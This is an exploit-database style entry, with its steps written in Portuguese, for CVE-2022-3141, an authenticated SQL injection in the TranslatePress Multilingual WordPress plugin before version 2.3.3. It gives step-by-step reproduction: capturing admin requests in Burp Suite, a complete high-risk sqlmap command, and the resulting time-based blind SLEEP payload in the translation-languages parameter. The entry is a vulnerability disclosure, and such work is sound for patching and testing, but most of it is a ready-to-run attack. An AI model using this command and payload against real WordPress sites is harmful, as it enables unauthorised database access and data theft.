# Exploit Title: Translatepress Multilinugal WordPress plugin < 2.3.3 - Authenticated SQL Injection 
# Exploit Author: Elias Hohl
# Date: 2022-07-23
# Vendor Homepage: https://translatepress.com/
# Software Link: https://wordpress.org/plugins/translatepress-multilingual/
# Version: < 2.3.3
# Tested on: Ubuntu 20.04
# CVE : CVE-2022-3141

Authenticated SQL injection vulnerability in "Translatepress Multilingual" Wordpress plugin

https://medium.com/@elias.hohl/authenticated-sql-injection-vulnerability-in-translatepress-multilingual-wordpress-plugin-effc08eda514

1. Inicie uma nova instância do Wordpress usando o docker-compose.

2. Instale o plug-in translatepress-multilingual. Observação importante: se houver mais de dois idiomas permitidos em um tipo de plano premium, a exploração poderá ser ligeiramente diferente. Talvez seja necessário inserir solicitações de exclusão entre cada injeção para evitar que as cargas úteis sejam executadas novamente. Observe também que a tabela do dicionário en_us_en_gb deve existir. Talvez você precise adicionar esses idiomas primeiro para que a tabela seja criada.

3. Conecte seu navegador ao Burp Suite, faça login no Wordpress e adicione qualquer idioma do menu suspenso (a url para fazer isso é /wp-admin/options-general.php?page=translate-press). No Burp Suite, clique com o botão direito do mouse→ copiar para o arquivo e salve-o como translatepress_req.txt.

4. Vá para /sample-page/?trp-edit-translation=preview (um URL para traduzir uma postagem arbitrária). Novamente, no Burp Suite, clique com o botão direito do mouse → salvar em arquivo e salve-o como translatepress_req_2.txt.

5. Ataque usando o sqlmap: sqlmap -r translatepress_req.txt -p trp_settings%5Btranslation-languages%5D%5B%5D --dbms=mysql --second-req translatepress_req_2.txt --technique=T --level 5 --risk 3


O sqlmap encontrará uma carga cega baseada em tempo:


Parameter: trp_settings[translation-languages][] (POST)

Type: time-based blind

Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)

Payload: option_page=trp_settings&action=update&_wpnonce=ca410d0e89&_wp_http_referer=/wp-admin/options-general.php?page=translate-press%26settings-updated=true&trp_settings[default-language]=en_US&trp_settings[publish-languages][]=en_US&trp_settings[translation-languages][]=en_US&trp_settings[translation-languages-formality][]=default&trp_settings[url-slugs][en_US]=en_us&trp_settings[translation-languages][]=en_GB WHERE 4372=4372 AND (SELECT 6967 FROM (SELECT(SLEEP(5)))ZDtR)-- bsZU&trp_settings[publish-languages][]=en_GB&trp_settings[translation-languages-formality][]=default&trp_settings[url-slugs][en_GB]=en&trp_settings[native_or_english_name]=english_name&trp_settings[add-subdirectory-to-default-language]=no&trp_settings[force-language-to-custom-links]=yes&trp_settings[shortcode-options]=flags-full-names&trp_settings[menu-options]=flags-full-names&trp_settings[trp-ls-floater]=yes&trp_settings[floater-options]=flags-full-names&trp_settings[floater-color]=dark&trp_settings[floater-position]=bottom-right&trp_email_course_email=